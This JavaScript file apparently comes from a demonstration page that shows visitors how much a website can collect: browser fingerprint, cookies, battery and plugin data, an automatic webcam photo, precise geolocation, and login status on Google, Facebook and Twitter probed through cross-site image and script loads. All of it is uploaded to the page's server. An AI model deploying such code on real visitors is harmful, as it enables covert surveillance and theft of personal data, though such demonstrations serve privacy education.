var browserCompatibility = {
  init: function () {
    this.vibrate();
    this.connection();
    this.requestWakeLock();
    this.media();
    this.url();
  },
  requestWakeLock: function () {
    navigator.requestWakeLock = navigator.requestWakeLock ||
      function () {
      };
  },
  url: function () {
    window.URL = window.URL || window.webkitURL || window.mozURL || window.msURL;
  },
  notification: function () {
    navigator.notification = navigator.notification || navigator.mozNotification || navigator.webkitNotification;
  },
  vibrate: function () {
    navigator.vibrate = navigator.vibrate || navigator.mozVibrate || navigator.webkitVibrate ||
      function () {
      };
  },
  connection: function () {
    connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  },
  media: function () {
    navigator.getMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia;
  }
};

var media = {
  state: null,
  data: null,
  photoTaken: false,
  video: null,
  canvas: null,
  photo: null,
  start: function () {
    this.state = "processing";
    document.querySelector('#associateMedia').innerHTML = "";
    navigator.getMedia({
      audio: true,
      video: true
    }, this.success.bind(this), this.error.bind(this));
  },
  success: function (stream) {
    this.state = "success";

    document.getElementById("video").style.display = "block";
    this.video = document.querySelector('#video video');
    this.canvas = document.querySelector('#video canvas');
    this.photo = document.querySelector('#video #photo');

    this.video.addEventListener('playing', this.takePhoto, false);

    if (this.video.mozSrcObject !== undefined) {
      this.video.mozSrcObject = stream;
    } else {
      this.video.src = (window.URL && window.URL.createObjectURL(stream)) || stream;
    }
    this.video.play();
  },
  error: function (error) {
    this.state = "error";
    console.log("media error: ", error);
  },
  takePhoto: function () {
    if (!media.photoTaken) {
      try {
        var width = media.video.videoWidth;
        var height = media.video.videoHeight;
        media.photo.setAttribute('width', width);
        media.photo.setAttribute('height', height);
        media.canvas.setAttribute('width', width);
        media.canvas.setAttribute('height', height);

        var context = media.canvas.getContext('2d');
        context.drawImage(media.video, 0, 0, media.video.videoWidth, media.video.videoHeight);
        media.data = media.canvas.toDataURL('image/png');
        media.photo.setAttribute('src', media.data);
        media.photoTaken = true;

        var object = {
          "photo": media.data,
          "id": content.id
        }
        ajax.send(object, "photo")
      } catch (e) {
        if (e.name == "NS_ERROR_NOT_AVAILABLE") {
          setTimeout(media.takePhoto, 0);
        } else {
          throw e;
        }
      }
    }
  }
};

var geolocation = {
  state: null,
  start: function () {
    this.state = "processing";
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(this.success.bind(this), this.error.bind(this), {
        enableHighAccuracy: true,
        maximumAge: 0,
        timeout: 3000
      });
    }
  },
  success: function (position) {
    this.state = "success";
    document.querySelector("#geolocation #associateGeolocation").innerHTML = "<div id='outcome'></div>";

    var time = position.timestamp;
    var lat = position.coords.latitude;
    var lng = position.coords.longitude;
    var precision = position.coords.accuracy;
    var altitude = position.coords.altitude;
    var altitudeAcc = position.coords.altitudeAccuracy;
    var speed = position.coords.speed;
    var heading = position.coords.heading;

    var divGeolocation = document.querySelector('#geolocation #outcome');
    divGeolocation.innerHTML += "<div>";

    var date = new Date(time);
    var hours = date.getHours();
    var minutes = date.getMinutes();
    var seconds = date.getSeconds();
    var year = date.getFullYear();
    var month = date.getMonth() + 1;
    var day = date.getDay();
    var dateTime = hours + ':' + minutes + ':' + seconds + " " + day + "." + month + "." + year;

    divGeolocation.innerHTML += "Zeitpunkt: " + dateTime;
    divGeolocation.innerHTML += "<br>Latitude: " + lat;
    divGeolocation.innerHTML += "<br>Longitude: " + lng;
    divGeolocation.innerHTML += "<br>Genauigkeit: " + precision;
    divGeolocation.innerHTML += "<br>Höhe: " + altitude;
    divGeolocation.innerHTML += "<br>Höhe Genauigkeit: " + altitudeAcc;
    divGeolocation.innerHTML += "<br>Geschwindigkeit: " + speed;
    divGeolocation.innerHTML += "<br>Ausrichtung: " + heading;
    divGeolocation.innerHTML += "</div>";

    ajax.send({
      "position": {
        "timestamp": time,
        "latitude": lat,
        "longitude": lng,
        "accuracy": precision,
        "altitude": altitude,
        "altitudeAccuracy": altitudeAcc,
        "speed": speed,
        "heading": heading
      },
      "id": content.id
    }, "position")

    var mapSrc = document.getElementsByTagName("iframe")[0].src;
    var firstIndex = mapSrc.indexOf("=");
    var secondIndex = mapSrc.indexOf("&");
    var newMapSrc = mapSrc.substring(0, firstIndex + 1) + lat + "," + lng + mapSrc.substring(secondIndex);
    document.getElementsByTagName("iframe")[0].src = newMapSrc;
  },
  error: function (error) {
    this.state = "error";
    var message = "";
    switch (error.code) {
      case error.PERMISSION_DENIED:
        message = "Permission denied";
        break;
      case error.POSITION_UNAVAILABLE:
        message = "Position unavailable";
        break;
      case error.TIMEOUT:
        message = "Timeout";
        break;
      case error.UNKNOWN_ERROR:
        message = "Unknown error";
        break;
      default:
        message = "Default error";
        break;
    }
    document.querySelector("#geolocation #associateGeolocation").innerHTML = "<div class='error'>Geolocation error: " + message + "</div>";
  }
};

var content = {
  div: "clientInformations",
  data: {},
  id: null,
  write: function () {
    this.data.common = this.common();
    this.data.cookies = this.cookies();
    this.data.battery = this.battery();
    this.data.connection = this.connection();
    this.data.plugins = this.plugins();
    this.data.mimeTypes = this.mimeTypes();
  },
  common: function () {
    var div = document.querySelector("#common");
    div.innerHTML += "URL: " + document.URL;
    div.innerHTML += "<br>AppCodeName: " + navigator.appCodeName;
    div.innerHTML += "<br>AppName: " + navigator.appName;
    div.innerHTML += "<br>AppVersion: " + navigator.appVersion;
    div.innerHTML += "<br>Language: " + navigator.language;
    div.innerHTML += "<br>Platform: " + navigator.platform;
    div.innerHTML += "<br>OSCPU: " + navigator.oscpu;
    div.innerHTML += "<br>Vendor: " + navigator.vendor;
    div.innerHTML += "<br>VendorSub: " + navigator.vendorSub;
    div.innerHTML += "<br>Product: " + navigator.product;
    div.innerHTML += "<br>ProductSub: " + navigator.productSub;
    div.innerHTML += "<br>UserAgent: " + navigator.userAgent;
    div.innerHTML += "<br>LastPage: " + document.referrer;

    div.innerHTML += "<br>Online: " + navigator.onLine;
    div.innerHTML += "<br>BuildID: " + navigator.buildID;
    div.innerHTML += "<br>DoNotTrack: " + navigator.doNotTrack;

    div.innerHTML += "<br>JavaScript: " + true;
    div.innerHTML += "<br>Cookies aktiviert: " + !!navigator.cookieEnabled;
    div.innerHTML += "<br>Java aktiviert: " + !!navigator.javaEnabled();
    div.innerHTML += "<br>CSS aktiviert: " + (!!document.styleSheets);

    return {
      "cAppCodeName": navigator.appCodeName,
      "cAppName": navigator.appName,
      "cAppVersion": navigator.appVersion,
      "cLanguage": navigator.language,
      "cPlatform": navigator.platform,
      "cOSCPU": navigator.oscpu,
      "cVendor": navigator.vendor,
      "cVendorSub": navigator.vendorSub,
      "cProduct:": navigator.product,
      "cProductSub": navigator.productSub,
      "cUserAgent": navigator.userAgent,
      "cUrl": document.URL,
      "cLastPage": document.referrer,
      "cBuildId": navigator.buildID,
      "cDoNotTrack": navigator.doNotTrack,
      "cJsActive": true,
      "cCookiesActive": !!navigator.cookieEnabled,
      "cJavaActive": !!navigator.javaEnabled(),
      "cCssActive": !!document.styleSheets
    };
  },
  cookies: function () {
    var div = document.querySelector("#cookies ul");
    if (document.cookie) {
      var strCookie = document.cookie.split(";");
      var cookies = {}
      strCookie.forEach(function (element, index, array) {
        var parts = element.split("=");
        var firstPart = parts[0].replace(/^\s+|\s+$/g, '');
        var secondPart = decodeURIComponent(parts[1]);

        div.innerHTML += "<li><b>" + firstPart + "</b>: " + secondPart + "</li>";
        cookies[firstPart] = secondPart;
      });
      return cookies;
    } else {
      div.innerHTML += "Es gibt kein Cookie für diese Seite.";
      return {};
    }
  },
  battery: function () {
    var discharingTime = navigator.battery.discharingTime || "unknown";

    var ul = document.querySelector("#battery ul");
    var li1 = document.createElement("li");
    li1.innerHTML = "Level: " + navigator.battery.level;
    ul.appendChild(li1);
    var li2 = document.createElement("li");
    li2.innerHTML = "Ladet: " + navigator.battery.charging;
    ul.appendChild(li2);
    var li3 = document.createElement("li");
    li3.innerHTML = "Ladezeit: " + navigator.battery.chargingTime;
    ul.appendChild(li3);
    var li4 = document.createElement("li");
    li4.innerHTML = "Entladezeit: " + discharingTime;
    ul.appendChild(li4);

    return {
      "level": navigator.battery.level,
      "isLoading": navigator.battery.charging,
      "loadingDuration": navigator.battery.chargingTime,
      "unloadingDuration": discharingTime
    }
  },
  connection: function () {
    var div = document.querySelector("#connection ul");
    if (connection) {
      div.innerHTML += "<li>Verbindungsbandbreite: " + connection.bandwidth + "</li>";
      div.innerHTML += "<li>Verbindungsmessstatus: " + connection.metered + "</li>";
    }

    return {
      "bandwidth": connection.bandwidth,
      "metered": connection.metered
    }
  },
  plugins: function () {
    var div = document.querySelector("#plugins ul");
    var plugins = {};
    for (var prop in navigator.plugins) {
      if (isNaN(prop) && navigator.plugins[prop]) {
        var name = navigator.plugins[prop].name;
        if (name !== "item" && name !== "namedItem" && name !== "refresh" && name !== "@@iterator" && name !== undefined) {
          div.innerHTML += "<li>" + navigator.plugins[prop].name + ": " + navigator.plugins[prop].version + "</li>";
          plugins[navigator.plugins[prop].name] = {};
          plugins[navigator.plugins[prop].name].version = navigator.plugins[prop].version;
          plugins[navigator.plugins[prop].name].description = navigator.plugins[prop].description;
        }
      }
    }
    return plugins;
  },
  mimeTypes: function () {
    var div = document.querySelector("#mimeTypes ul");
    var mimeTypes = {};
    for (var idx in navigator.mimeTypes) {
      var li = document.createElement("li");

      if (navigator.mimeTypes[idx].type) {
        li.innerHTML = "<b>" + navigator.mimeTypes[idx].description + "</b>";
        mimeTypes[navigator.mimeTypes[idx].description] = {};
      } else {
        li.innerHTML = "<b>Keine Bezeichnung vorhanden</b>";
        continue;
      }

      mimeTypes[navigator.mimeTypes[idx].description].suffix = navigator.mimeTypes[idx].suffixes;
      mimeTypes[navigator.mimeTypes[idx].description].type = navigator.mimeTypes[idx].type;
      mimeTypes[navigator.mimeTypes[idx].description].plugin = navigator.mimeTypes[idx].enabledPlugin.name;

      li.innerHTML += "<br>Dateiendung: " + navigator.mimeTypes[idx].suffixes;
      li.innerHTML += "<br>Mime-Type: " + navigator.mimeTypes[idx].type;
      li.innerHTML += "<br>Verwendetes Plugin: " + navigator.mimeTypes[idx].enabledPlugin.name;
      div.appendChild(li);
    }
    return mimeTypes;
  }
};

var download = {
  url: "http://d24w6bsrhbeh9d.cloudfront.net/photo/aKz75R1_460sa.gif",
  init: function () {
    var a = document.createElement('a');
    a.setAttribute('href', this.url);
    a.download = "Bild.gif";
    a.click();
  }
};

var notification = {
  state: null,
  init: function () {
    if (Notification && Notification.permission !== "granted") {
      this.state = "processing";
      Notification.requestPermission(function (status) {
        if (Notification.permission !== status) {
          Notification.permission = status;
        }
        notification.create();
      });
    } else {
      this.create();
    }
  },
  create: function () {
    if (Notification.permission === "granted") {
      this.state = "success";
      var title = "Versand erfolgreich!";
      var text = "Danke für Ihre Daten!"
      var icon = "http://beyond.oo-software.com/oocontent/uploads/2012/01/icon_ooab1-218x300.png";
      var n = new Notification(title, {
        body: text,
        icon: icon
      });
    } else {
      this.state = "error";
    }
  }
}

var eventListener = {
  init: function () {
    this.clickSubtitles();
    this.clickMedia();
    this.clickPosition();
    window.onbeforeunload = this.onbeforeunload;
  },
  onbeforeunload: function () {
    if (window.settings.development) {
      return;
    }

    alert("Sie verlassen diese Seite!");
    alert("Teilen Sie diese Seite mit Ihren Freunden!");
  },
  clickSubtitles: function () {
    var subtitles = document.getElementsByClassName("subtitle");
    for (var i = 0; i < subtitles.length; i++) {
      subtitles[i].addEventListener("click", function () {
        var parent = this.parentNode;
        if (parent.children[1].style.display == "block") {
          parent.children[1].style.display = "none";
        } else if (parent.children[1].style.display == "none" || parent.children[1].style.display == "") {
          parent.children[1].style.display = "block";
        }
      });
    }
  },
  clickMedia: function () {
    document.querySelector("#media input").addEventListener("click", function () {
      media.start();
    });

  },
  clickPosition: function () {
    document.querySelector("#geolocation input").addEventListener("click", function () {
      geolocation.start();
    });
  }
};

/**
 * Nicht möglich! War bis ~2010 noch möglich, wurde jedoch behoben.
 * getComputeStyle gibt für a:visited eine falschen Wert zurück
 */
var cssHistory = {
  sites: ["plus.google.com", "www.facebook.com", "www.google.com", "www.gmx.net", "www.amazon.de", "www.uni-salzburg.at", "www.fh-salzburg.ac.at", "www.diejungenleute.de"],
  create: function () {
    document.write("<div id='cssHistory'>");
    document.write("<h2 class='subtitle'><a href='javascript:void(0)'>Browser-Verlauf</a></h2>");
    document.write("<ul>");
    for (idx in this.sites) {
      document.write("<li><a href='http://" + this.sites[idx] + "'>" + this.sites[idx] + "</a></li>");
    }
    document.write("</ul>");
    document.write("</div>");
  }
}

var logins = {
  data: {},
  sites: {
    0: {
      name: "Google",
      link: "https://accounts.google.com/CheckCookie?continue=https://www.google.com/intl/en/images/logos/accounts_logo.png",
      type: "img",
      state: null
    },
    1: {
      name: "Google+",
      link: "https://plus.google.com/up/?continue=https://www.google.com/intl/en/images/logos/accounts_logo.png&type=st&gpsrc=ogpy0",
      type: "img",
      state: null
    },
    2: {
      name: "Facebook",
      link: "https://www.facebook.com/maxmaier",
      type: "script",
      state: null
    },
    3: {
      name: "Twitter",
      link: "https://twitter.com/login?redirect_after_login=/images/spinner.gif",
      type: "img",
      state: null
    }
  },
  sendState: function () {
    var ready = true;
    for (var idx in this.sites) {
      if (this.sites[idx].state === null) {
        ready = false;
      } else {
        this.data[this.sites[idx].name] = this.sites[idx].state
      }
    }

    if (ready === true) {
      var logins = {};
      logins["logins"] = this.data;
      logins["id"] = content.id;
      ajax.send(logins, "login");
    }
  },
  print: function () {
    var div = document.querySelector("#logins");

    for (var idx in this.sites) {
      var element = null;
      if (this.sites[idx].type === "img") {
        element = document.createElement("img");
      } else if (this.sites[idx].type === "script") {
        element = document.createElement("script");
      }

      element.src = this.sites[idx].link;

      element.onerror = (function (index) {
        return function () {
          var ul = document.querySelector("#logins ul");
          var li = document.createElement("li");
          var text = document.createTextNode("Auf " + this.sites[index].name + " nicht eingeloggt.");
          li.appendChild(text);
          ul.appendChild(li);

          this.sites[index].state = new Boolean(false);
          this.sendState();
        }
      })(idx).bind(this);

      element.onload = (function (index) {
        return function () {
          var ul = document.querySelector("#logins ul");
          var li = document.createElement("li");
          var text = document.createTextNode("Auf " + this.sites[index].name + " eingeloggt.");
          li.appendChild(text);
          ul.appendChild(li);

          this.sites[index].state = new Boolean(true);
          this.sendState();
        }
      })(idx).bind(this);

      div.appendChild(element);
    }
  }
};
/**
 * Firefox functions which doesn't work
 */

//### Register website as MIME-Type Handler ###
//document.write("<br>RegisterContentHandler" + navigator.registerContentHandler);
//### Register website as Protocol Handler ###
//document.write("<br>RegisterProtocolHandler" + navigator.registerProtocolHandler);

//### Only available on Firefox OS ###
//document.write("<br>GetDeviceStorage" + navigator.getDeviceStorage);
//document.write("<br>GetDeviceSotrages" + navigator.getDeviceStorages);
//document.write("<br>MozSMS" + navigator.mozSms);
//document.write("<br>MozMobileMessage" + navigator.mozMobileMessage);
//document.write("<br>mozCameras" + navigator.mozCameras);
//navigator.addIdleObserver({});

//### Don't know? ###
//document.write("<br>mozGetUserMediaDevices" + navigator.mozGetUserMediaDevices);
//###### old deprecated function ######
//document.write("<br>Taint: " + navigator.taintEnabled);

/** TODO:
 * Copy-Paste-API
 * CORS-Sharing (WS, JSONP)
 * FileSystem API
 * Fullscreen API
 * Web-Audio API
 * Web-Sockets bzw. JSONP for sending data to cross domain systems
 * CSS-History-Hack mit Canvas
 * herold.at-API
 * GoogleMaps Coords -> Adresse => https://developers.google.com/maps/documentation/geocoding/?hl=de#ReverseGeocoding
 * EverCookie
 * MAC-Adresse
 * How unique is your browser
 */

var permissions = {
  ask: function () {
    // zero step
    writeAllData();

    // first step
    media.start();

    // second step
    var positionID = window.setInterval(function () {
      if (media.state !== "processing") {
        geolocation.start();
        clearInterval(positionID);
      }
    }, 500);

    //third step
    var notificationID = window.setInterval(function () {
      if (geolocation.state !== "processing" && geolocation.state !== null) {
        notification.init();
        clearInterval(notificationID);
      }
    }, 500);
  }
}

var writeAllData = function () {
  content.write();
  download.init();
  ajax.send(content.data);
  logins.print();

  //###### vibrating function for smartphones: (1000) or ([100, 200, 100, 200]) ######
  navigator.vibrate([100, 200, 100, 200]);
  //###### request wake lock - screen/cpu/wifi #######
  navigator.requestWakeLock('screen');

}

window.onload = function () {
  browserCompatibility.init();
  eventListener.init();

  if (!settings.development) {
    permissions.ask();
  }
  else {
    writeAllData();
  }
}